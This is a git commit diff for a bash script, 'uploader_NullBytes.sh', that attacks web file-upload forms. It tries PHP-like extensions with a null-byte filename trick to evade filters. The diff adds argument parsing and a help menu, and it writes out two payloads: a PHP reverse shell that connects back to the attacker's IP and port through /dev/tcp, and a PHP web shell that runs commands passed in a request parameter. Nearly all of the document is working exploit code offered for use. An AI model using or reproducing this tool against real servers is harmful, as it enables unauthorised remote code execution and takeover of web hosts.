bb913dbb01dcdeb415cf867c2df5b6f542d9f347
Komodo <144389222+Komodo-pty@users.noreply.github.com>
2025-05-18 16:28:03 -0700

    Add files via upload
    I added a case statement because I'm pretentious like that.

--- uploader_NullBytes.sh
+++ uploader_NullBytes.sh
@@ -1,33 +1,91 @@
 #!/bin/bash
 
-echo -e "\nEnter the target URL:\n"
-read url
+line="\n============================================================\n"
 
-echo -e "\nLook at a valid POST Request for reference. What is the value of the name attribute? (e.g. file for name=\"file\"):\n"
-read form_field
+Help()
+{
+	echo -e "$line\nUploader will run in interactive mode if you don't supply a value for required parameters\n"
+	echo -e "Uploader supports the following arguments:\n\n-h: Display this help message\n\n"
+	echo -e "-i <IP_Addres>: The IP Address to use for the Reverse Shell payload (i.e. your interface)\n\n"
+	echo -e "-p <PORT>: The port that your listener is running on\n\n"
+	echo -e "-u <URL>: The target URL that's used in POST Requests to upload a file\n\n"
+	echo -e "-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name=\"file\")\n\n"
+	echo -e "-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to."
+	echo -e "-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e"
+
+}
+
+if [ $# -eq 0 ]
+then
+        echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
+
+else
+	while getopts ":hi:p:u:n:e:b" option; do
+        	case $option in
+			h)
+                        	Help
+                                exit;;
+
+			i)
+				ip=$OPTARG;;
+
+			p)
+				port=$OPTARG;;
+
+			u)
+				url=$OPTARG;;
+
+			n)
+				name=$OPTARG;;
+
+			e)
+				exploit=$OPTARG;;
+
+			b)
+				payload='<?php if(isset($_REQUEST['"'"'0'"'"'])){echo "<pre>"; system($_REQUEST['"'"'0'"'"']); echo "</pre>"; die;} ?>'
+
+			\?)
+                                echo -e "\nError: Invalid argument"
+                                exit;;
+                esac
+	done
+
+
+fi
+
+if [[ -z "$url" ]]
+then
+	echo -e "\nEnter the target URL:\n"
+	read url
+fi
+
+if [[ -z "$name" ]]
+then
+	echo -e "\nLook at a valid POST Request for reference. What is the value of the name attribute? (e.g. file for name=\"file\"):\n"
+	read form_field
+fi
 
 submit_field="submit"
 submit_value="Upload"
 
-if [ $# -lt 2 ]; then
-  echo "The IP address & port weren't specified. Defaulting to interactive mode."
-
-	# Continue with the rest of the script if 2 or more arguments are provided
+if [[ -z "$ip" ]]
+then
 	echo -e "\nEnter your IP Address:\n"
 	read ip
-
-	echo -e "\nEnter your listner's port:\n"
-	read port
-else
-	ip=$1
-	port=$2
 fi
 
-echo "IP: $ip"
-echo "Port: $port"
+if [[ -z "$port" ]]
+then
+	echo -e "\nEnter your listner's port:\n"
+	read port
+fi
 
 # PHP payload to send as the file content
-payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'
+
+if [[ -z "$payload" ]]
+then
+	payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'
+fi
 
 # Extensions to try
 extensions=(php php3 php4 php5 php7 pht phps phar phpt pgif phtml phtm inc)
@@ -67,3 +125,8 @@ for ext in "${extensions[@]}"; do
   filename="testfile.$ext%00.jpg"
   upload_file "$filename"
 done
+
+if [[ -z "$exploit" ]]
+then
+	echo "coming soon"
+fi
